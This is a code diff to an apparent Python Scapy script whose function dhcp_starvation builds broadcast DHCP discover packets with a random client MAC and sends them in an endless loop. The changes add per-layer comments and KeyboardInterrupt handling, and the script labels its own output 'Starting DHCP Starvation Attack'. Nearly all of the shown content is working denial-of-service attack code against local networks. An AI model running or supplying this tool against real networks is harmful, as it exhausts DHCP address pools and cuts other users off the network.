@@ -13,16 +13,21 @@ def dhcp_starvation(interface):
 
     # Construct a DHCP discover packet
     dhcp_discover = (
-            Ether(dst='ff:ff:ff:ff:ff:ff', src=random_mac) /
-            IP(src='0.0.0.0', dst='255.255.255.255') /
-            UDP(sport=68, dport=67) /
-            BOOTP(op=1, chaddr=random_mac) /
-            DHCP(options=[('message-type', 'discover'), 'end'])
+        Ether(dst='ff:ff:ff:ff:ff:ff', src=random_mac) /  # Broadcast Ethernet frame
+        IP(src='0.0.0.0', dst='255.255.255.255') /        # Broadcast IP packet
+        UDP(sport=68, dport=67) /                         # UDP: client port 68, server port 67
+        BOOTP(op=1, chaddr=random_mac) /                  # BOOTP: operation code 1 (request)
+        DHCP(options=[('message-type', 'discover'), 'end'])  # DHCP: message type 'discover'
     )
 
     # Send packets continuously on the specified interface
     print(f"[*] Starting DHCP Starvation Attack on interface {interface}...")
-    sendp(dhcp_discover, iface=interface, loop=1, verbose=1)
+    try:
+        sendp(dhcp_discover, iface=interface, loop=1, verbose=1)
+    except KeyboardInterrupt:
+        print("\n[*] Attack stopped by user.")
+    except Exception as e:
+        print(f"[!] An error occurred: {e}")
 
 if __name__ == "__main__":
     # Set up argument parsing
